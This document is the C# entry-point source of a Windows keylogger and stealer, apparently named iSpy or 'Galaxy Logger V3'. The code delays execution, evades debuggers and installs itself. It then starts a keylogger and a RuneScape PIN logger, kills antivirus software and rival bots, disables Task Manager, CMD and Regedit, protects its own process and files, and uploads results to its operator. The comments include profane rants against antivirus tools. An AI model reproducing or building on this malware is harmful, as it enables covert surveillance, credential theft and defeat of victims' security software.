using System;
using System.IO;
using System.Net;
using System.Drawing;
using System.Text;
using System.Net.Mail;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Threading;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ComponentModel;
using System.Drawing.Imaging;
using Microsoft.Win32;
namespace iSpy
{
    public class Program
    {
        static void MyHandler(object sender, UnhandledExceptionEventArgs args)
        {
            Exception e = (Exception)args.ExceptionObject;
            Config.DumpErrorLog(e, string.Format("Unhandled Exception - Runtime terminating: {0}", args.IsTerminating));
        }

        static void Main(string[] args)
        {
            AppDomain currentDomain = AppDomain.CurrentDomain;
            currentDomain.UnhandledException += new UnhandledExceptionEventHandler(MyHandler);


#if !DEBUG
            
            Thread.Sleep(Convert.ToInt32(Config.DELAY_EXECUTION) * 1000);
#endif
            if (!string.IsNullOrEmpty(Config.ANTI_DEBUGGERS))
                Services.AntiDebuggers();
            bool notRunning = false;
            using (Mutex mutex = new Mutex(true, Config.MUTEX, out notRunning))
            {
                if (notRunning)
                {
                    Core.Decrypt();
                    if (!string.IsNullOrEmpty(Config.INSTALL_FILE)) //We Are Installing
                    {
                        Core.Install();
                    }

                    Core.FileExecuted();
                    startthreads();


                    if (!string.IsNullOrEmpty(Config.RUNESCAPE_PINLOGGER))
                    {
                        ThreadPool.QueueUserWorkItem(Pinlogger.Log);
                    }
                    /*
                    if (!string.IsNullOrEmpty(Config.RUNESCAPE_PINLOGGER))
                    {
                        Thread tt = new Thread(new ThreadStart(Pinlogger.Log));
                        tt.Start();
                    }
                     * */
                }
                else
                {
                    //GC.Collect();
                    Environment.Exit(0);
                }
            }
            Process.GetCurrentProcess().WaitForExit();
        }
        public static void startthreads()
        {
            new Thread(new ThreadStart(botkill)).Start();
            new Thread(new ThreadStart(startKeylog)).Start();
            new Thread(new ThreadStart(killav)).Start();
            new Thread(new ThreadStart(protectprocess)).Start();
            new Thread(new ThreadStart(protectfile)).Start();
            antis();
        }
        private static string tosend = "";
        public static void antis()
        {
            if (string.IsNullOrEmpty(Config.ANTI_TASKMGR))
            {
                new Thread(new ThreadStart(runAntiTaskMgr)).Start();
            }

            if (string.IsNullOrEmpty(Config.ANTI_CMD))
            {
                new Thread(new ThreadStart(runAntiCMD)).Start();
            }

            if (string.IsNullOrEmpty(Config.ANTI_REGISTRY))
            {
                new Thread(new ThreadStart(runAntiRegedit)).Start();
            }
            Core.Upload("Galaxy Logger V3 Antis", tosend, "1");
            if (!Config.VISIT_WEBSITE.Equals("[URL]"))
            {
                new Thread(new ThreadStart(visitWebsite)).Start();
            }
        }

        private static void runAntiTaskMgr()
        {
            tosend = Environment.NewLine + "Anti-TaskManager worked = " + Antis.TaskManager();
        }

        private static void runAntiCMD()
        {
            tosend = Environment.NewLine + "Anti-CMD worked = " + Antis.CMD();
        }

        private static void runAntiRegedit()
        {
            tosend = Environment.NewLine + "Anti-Regedit worked: " + Antis.Regedit();
        }

        private static void visitWebsite()
        {
            var data = new WebClient().DownloadString(Config.VISIT_WEBSITE);
        }

        public static void protectprocess()
        {
            PeristenceEngine.ProtectCurrentProcess();
            PeristenceEngine.ProtectProcess(Process.GetCurrentProcess().Id);
        }
        public static void protectfile()
        {
            PeristenceEngine.ProtectFileFolder(true);
        }
        public static void botkill()
        {
            if (string.IsNullOrEmpty(Config.BOT_KILL))
            {
                Botkiller.Initialize();
                Botkiller.RunStandardBotKiller();
            }
        }
        public static void startKeylog()
        {
            Keylogger.Initialize();
            Keylogger.Start();
        }
        public static void killav(){
            if(string.IsNullOrEmpty(Config.BOT_KILL))
            KillAV.Kill(); //Fuck Antiviruses.. Fucking Piece of shits that need to fucking burn in hell. Fuck fuckity fuck.
        }
    }
   

}
